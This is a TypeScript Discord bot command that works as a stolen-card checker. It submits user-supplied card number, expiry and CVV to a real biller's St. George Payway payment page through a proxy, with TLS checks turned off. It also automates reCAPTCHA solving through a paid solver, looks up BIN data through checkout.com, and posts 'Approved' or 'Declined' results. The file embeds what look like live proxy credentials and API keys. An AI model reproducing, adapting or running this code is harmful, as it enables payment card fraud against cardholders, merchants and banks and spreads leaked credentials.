import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from "discord.js";
import axios from "axios";
import https from "https";

const PROXY_CONFIG = {
  host: "brd.superproxy.io",
  port: 33335,
  auth: {
    username: "brd-customer-hl_b34735e4-zone-datacenter_proxy1",
    password: "2rupnulv0s5o",
  },
};

const httpsAgent = new https.Agent({
  rejectUnauthorized: false,
});

const CAPMONSTER_API_KEY = "7656658f727e9be323b0c60e0af37b14";
const CAPMONSTER_API_URL = "https://api.capmonster.cloud";
const RECAPTCHA_SITE_KEY = "6LcREDkgAAAAAING5nGn9tYkp7vMspe8oxSbXr1E";
const BILLER_CODE = "420364";
const CLIENT_NUMBER = "Q42036";

function generateRandomString(length: number, type: 'letters' | 'digits' = 'letters'): string {
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const chars = type === 'letters' ? letters : digits;
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function parseJsonValue(source: string, leftDelim: string, rightDelim: string): string {
  const leftIndex = source.indexOf(leftDelim);
  if (leftIndex === -1) return "";
  const start = leftIndex + leftDelim.length;
  const rightIndex = source.indexOf(rightDelim, start);
  if (rightIndex === -1) return "";
  return source.substring(start, rightIndex);
}

// Cookie management
function extractCookies(setCookieHeaders: string | string[] | undefined): Map<string, string> {
  const cookies = new Map<string, string>();
  if (!setCookieHeaders) return cookies;

  const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
  
  for (const header of headers) {
    if (!header || typeof header !== 'string') continue;
    
    // Extract cookie name and value (everything before first semicolon)
    const cookiePart = header.split(';')[0].trim();
    const equalIndex = cookiePart.indexOf('=');
    if (equalIndex === -1) continue;
    
    const name = cookiePart.substring(0, equalIndex).trim();
    const value = cookiePart.substring(equalIndex + 1).trim();
    
    if (name && value) {
      cookies.set(name, value);
    }
  }
  
  return cookies;
}

function formatCookieHeader(cookieMap: Map<string, string>): string {
  return Array.from(cookieMap.entries())
    .map(([name, value]) => `${name}=${value}`)
    .join('; ');
}

function mergeCookies(existing: Map<string, string>, newCookies: Map<string, string>): Map<string, string> {
  const merged = new Map(existing);
  for (const [name, value] of newCookies) {
    merged.set(name, value);
  }
  return merged;
}

async function solveRecaptchaV2(pageUrl: string, siteKey: string): Promise<string> {
  try {
    const createTaskResponse = await axios.post(
      `${CAPMONSTER_API_URL}/createTask`,
      {
        clientKey: CAPMONSTER_API_KEY,
        task: {
          type: "RecaptchaV2TaskProxyless",
          websiteURL: pageUrl,
          websiteKey: siteKey,
        },
      },
      {
        httpsAgent: httpsAgent,
        timeout: 30000,
      }
    );

    const taskId = createTaskResponse.data.taskId;
    if (!taskId) {
      throw new Error(`Failed to create task: ${JSON.stringify(createTaskResponse.data)}`);
    }

    let attempts = 0;
    const maxAttempts = 60;
    
    while (attempts < maxAttempts) {
      await new Promise((resolve) => setTimeout(resolve, 2000));

      const getResultResponse = await axios.post(
        `${CAPMONSTER_API_URL}/getTaskResult`,
        {
          clientKey: CAPMONSTER_API_KEY,
          taskId: taskId,
        },
        {
          httpsAgent: httpsAgent,
          timeout: 30000,
        }
      );

      const status = getResultResponse.data.status;
      
      if (status === "ready") {
        const solution = getResultResponse.data.solution?.gRecaptchaResponse;
        if (solution) {
          return solution;
        } else {
          throw new Error("Solution not found in response");
        }
      } else if (status === "processing") {
        attempts++;
        continue;
      } else {
        throw new Error(`Task failed with status: ${status}`);
      }
    }

    throw new Error("Timeout waiting for captcha solution");
  } catch (error: any) {
    throw error;
  }
}

export const data = new SlashCommandBuilder()
  .setName("payway")
  .setDescription("Payway Gateway")
  .addStringOption((option) =>
    option
      .setName("card")
      .setDescription("Card details in format: CC|MM|YYYY|CVV")
      .setRequired(true)
  )
  .addStringOption((option) =>
    option
      .setName("amount")
      .setDescription("Payment amount (e.g., 1.00)")
      .setRequired(true)
  );

export async function execute(interaction: ChatInputCommandInteraction) {
  await interaction.deferReply();

  const cardInput = interaction.options.getString("card", true);
  const amountInput = interaction.options.getString("amount", true);

  const parts = cardInput.split("|");

  if (parts.length !== 4) {
    await interaction.editReply({
      content: "❌ Invalid format. Use: CC|MM|YYYY|CVV (e.g., 4111111111111111|12|2025|123)",
    });
    return;
  }

  const [cc, mm, yyyy, cvv] = parts.map((p) => p.trim());

  let yy1: string;
  if (yyyy.length === 4) {
    yy1 = yyyy.substring(2);
  } else if (yyyy.length === 2) {
    yy1 = yyyy;
  } else {
    await interaction.editReply({
      content: "❌ Invalid year format. Use YY or YYYY (e.g., 25 or 2025)",
    });
    return;
  }

  if (!cc || !mm || !yyyy || !cvv) {
    await interaction.editReply({
      content: "❌ All fields are required: CC|MM|YYYY|CVV",
    });
    return;
  }

  const amount = parseFloat(amountInput).toFixed(2);
  if (isNaN(parseFloat(amountInput))) {
    await interaction.editReply({
      content: "❌ Invalid amount format. Use a number (e.g., 1.00)",
    });
    return;
  }

  if (parseFloat(amount) < 1.00) {
    await interaction.editReply({
      content: "❌ Minimum amount is $1.00",
    });
    return;
  }

  try {
    const N1 = generateRandomString(5, 'letters');
    const N2 = generateRandomString(5, 'letters');
    const R6 = generateRandomString(6, 'digits');
    const cardholderName = `${N1} ${N2}`;

    const embed = new EmbedBuilder()
      .setTitle("Payway Gateway")
      .setColor(0x0099ff)
      .setDescription("Processing payment...")
      .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}|${cvv}\``, inline: true })
      .addFields({ name: "Amount", value: `$${amount}`, inline: true })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });

    let summaryCode = "";
    let status = "";
    let success = false;
    const cookies = new Map<string, string>();

    try {
      embed.setDescription("Processing payment...");
      await interaction.editReply({ embeds: [embed] });

      const handoffHeaders: any = {
        "Host": "payway.stgeorge.com.au",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": `https://payway.stgeorge.com.au/MakePayment?BillerCode=${BILLER_CODE}`,
        "Content-Type": "application/x-www-form-urlencoded",
      };

      const cookieHeader = formatCookieHeader(cookies);
      if (cookieHeader) {
        handoffHeaders["Cookie"] = cookieHeader;
      }

      const handoffResponse = await axios.post(
        "https://payway.stgeorge.com.au/hpp/HandoffAction",
        `BillerCode=${BILLER_CODE}&ClientNumber=${CLIENT_NUMBER}`,
        {
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: handoffHeaders,
          maxRedirects: 0,
          validateStatus: (status) => status >= 200 && status < 400,
          timeout: 15000,
        }
      );

      // Extract and merge cookies from response
      const setCookieHeader = handoffResponse.headers['set-cookie'] || handoffResponse.headers['Set-Cookie'];
      const newCookies = extractCookies(setCookieHeader);
      const merged = mergeCookies(cookies, newCookies);
      for (const [key, value] of merged) {
        cookies.set(key, value);
      }

      const location = handoffResponse.headers.location || handoffResponse.headers.Location || "";
      
      // Extract token from location: /hpp/enter-payment-details/TOKEN or /hpp/enter-payment-details/TOKEN/...
      let tok = "";
      const tokenMatch = location.match(/\/hpp\/enter-payment-details\/([^\/\?]+)/);
      if (tokenMatch && tokenMatch[1]) {
        tok = tokenMatch[1];
      } else {
        // Fallback: try parsing with existing function
        tok = parseJsonValue(location, "/hpp/enter-payment-details/", "/");
        if (!tok) {
          // If no trailing slash, try to get everything after the path
          const startIndex = location.indexOf("/hpp/enter-payment-details/");
          if (startIndex !== -1) {
            const tokenStart = startIndex + "/hpp/enter-payment-details/".length;
            const tokenEnd = location.indexOf("/", tokenStart);
            tok = tokenEnd !== -1 ? location.substring(tokenStart, tokenEnd) : location.substring(tokenStart);
          }
        }
      }

      if (!tok) {
        throw new Error(`Failed to get token from HandoffAction. Location: ${location}`);
      }

      embed.setDescription("Submitting payment details...");
      await interaction.editReply({ embeds: [embed] });

      const paymentDetailsHeaders: any = {
        "Host": "payway.stgeorge.com.au",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": `https://payway.stgeorge.com.au/hpp/enter-payment-details/${tok}/enter-payment-details`,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://payway.stgeorge.com.au",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "TE": "trailers",
      };

      const paymentCookieHeader = formatCookieHeader(cookies);
      if (paymentCookieHeader) {
        paymentDetailsHeaders["Cookie"] = paymentCookieHeader;
      }

      const paymentDetailsUrl = `https://payway.stgeorge.com.au/rest/internal/hpp/scopes/${tok}/payment-details`;
      const paymentDetailsBody = `paymentReference=${R6}&paymentAmount=${amount}&paymentOption=CREDIT_CARD&cardholderName=${encodeURIComponent(cardholderName)}&cardNumber=${cc}&expiryDateMonth=${mm}&expiryDateYear=${yy1}&cvn=${cvv}`;

      const paymentDetailsResponse = await axios.post(
        paymentDetailsUrl,
        paymentDetailsBody,
        {
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: paymentDetailsHeaders,
          timeout: 20000,
          validateStatus: (status) => status >= 200 && status < 500,
        }
      );

      // Extract and merge cookies from response
      const paymentSetCookie = paymentDetailsResponse.headers['set-cookie'] || paymentDetailsResponse.headers['Set-Cookie'];
      const paymentCookies = extractCookies(paymentSetCookie);
      const merged3 = mergeCookies(cookies, paymentCookies);
      for (const [key, value] of merged3) {
        cookies.set(key, value);
      }

      embed.setDescription("Solving reCAPTCHA v2...");
      await interaction.editReply({ embeds: [embed] });

      const captchaToken = await solveRecaptchaV2(
        `https://payway.stgeorge.com.au/hpp/enter-payment-details/${tok}/enter-payment-details`,
        RECAPTCHA_SITE_KEY
      );

      embed.setDescription("Submitting transaction...");
      await interaction.editReply({ embeds: [embed] });

      const transactionHeaders: any = {
        "Host": "payway.stgeorge.com.au",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": `https://payway.stgeorge.com.au/hpp/enter-payment-details/${tok}/enter-payment-details`,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://payway.stgeorge.com.au",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "TE": "trailers",
      };

      const transactionCookieHeader = formatCookieHeader(cookies);
      if (transactionCookieHeader) {
        transactionHeaders["Cookie"] = transactionCookieHeader;
      }

      const transactionResponse = await axios.post(
        `https://payway.stgeorge.com.au/rest/internal/hpp/scopes/${tok}/transactions`,
        `verification=${captchaToken}`,
        {
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: transactionHeaders,
          timeout: 15000,
        }
      );

      // Extract and merge cookies from response
      const transactionSetCookie = transactionResponse.headers['set-cookie'] || transactionResponse.headers['Set-Cookie'];
      const transactionCookies = extractCookies(transactionSetCookie);
      const merged4 = mergeCookies(cookies, transactionCookies);
      for (const [key, value] of merged4) {
        cookies.set(key, value);
      }

      // Parse JSON response - handle both string and object
      let transactionData: any;
      if (typeof transactionResponse.data === 'string') {
        try {
          transactionData = JSON.parse(transactionResponse.data);
        } catch (e) {
          // If parsing fails, try string extraction as fallback
          const responseData = transactionResponse.data;
          summaryCode = parseJsonValue(responseData, '"summaryCode" : "', '"') || parseJsonValue(responseData, '"summaryCode":"', '"');
          status = parseJsonValue(responseData, '"status" : "', '"') || parseJsonValue(responseData, '"status":"', '"');
          if (summaryCode && status) {
            success = status.toLowerCase().includes("success") || summaryCode === "SUCCESS";
          }
        }
      } else {
        transactionData = transactionResponse.data;
      }

      // Extract from nested transaction object (if JSON parsing succeeded)
      if (transactionData) {
        if (transactionData.transaction) {
          status = transactionData.transaction.status || "";
          summaryCode = transactionData.transaction.summaryCode || "";
        } else {
          // Fallback: try direct access
          status = transactionData.status || "";
          summaryCode = transactionData.summaryCode || "";
        }

        if (summaryCode && status) {
          success = status.toLowerCase().includes("approved") || status === "APPROVED" || summaryCode === "0";
        }
      }
    } catch (error: any) {
      // Error handled silently
    }

    // Get BIN info for all transactions
    let binInfo = "";
    try {
      const checkoutResponse = await axios.post(
        "https://api.checkout.com/tokens",
        {
          type: "card",
          number: cc,
          expiry_month: parseInt(mm),
          expiry_year: parseInt(yyyy),
          cvv: "",
          phone: {},
          preferred_scheme: "",
          requestSource: "JS",
        },
        {
          headers: {
            accept: "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.6",
            authorization: "pk_bt7fsefsfszdmxj7sv5kky5ez46",
            "content-type": "application/json",
            origin: "https://js.checkout.com",
            referer: "https://js.checkout.com/",
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
          },
          timeout: 10000,
        }
      );

      const binData = checkoutResponse.data;
      const binFull = parseJsonValue(JSON.stringify(binData), '"bin":"', '"');
      const issuer = parseJsonValue(JSON.stringify(binData), '"issuer":"', '"');
      const cardTypeBin = parseJsonValue(JSON.stringify(binData), '"card_type":"', '"');
      const cardCategory = parseJsonValue(JSON.stringify(binData), '"card_category":"', '"');
      const productType = parseJsonValue(JSON.stringify(binData), '"product_type":"', '"');
      const issuerCountry = parseJsonValue(JSON.stringify(binData), '"issuer_country":"', '"');

        binInfo = `${issuer} - ${cardTypeBin} ${cardCategory} - ${productType} - ${issuerCountry}`;
    } catch (error: any) {
      // BIN lookup error handled silently
    }

    const resultEmbed = new EmbedBuilder()
      .setTitle(success ? `✅ Approved $${amount} Payway Gateway` : `❌ Declined $${amount} Payway Gateway`)
      .setColor(success ? 0x00ff00 : 0xff0000)
      .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}|${cvv}\``, inline: false })
      .setTimestamp();

    if (status) {
      resultEmbed.addFields({
        name: "Status",
        value: `${status}${summaryCode ? ` - ${summaryCode}` : ""}`,
        inline: false,
      });
    }

    if (binInfo) {
      resultEmbed.addFields({
        name: "BIN Info",
        value: binInfo,
        inline: false,
      });
    }

    if (!status && !summaryCode) {
      resultEmbed.setDescription("⚠️ Could not process transaction. Gateway may be unavailable or card format invalid.");
    }

    const username = interaction.user.username || interaction.user.tag;
    resultEmbed.setFooter({ text: `Checked by ${username}` });

    await interaction.editReply({ embeds: [resultEmbed] });
  } catch (error: any) {
    await interaction.editReply({
      content: `❌ Error processing payment: ${error.message}`,
    });
  }
}
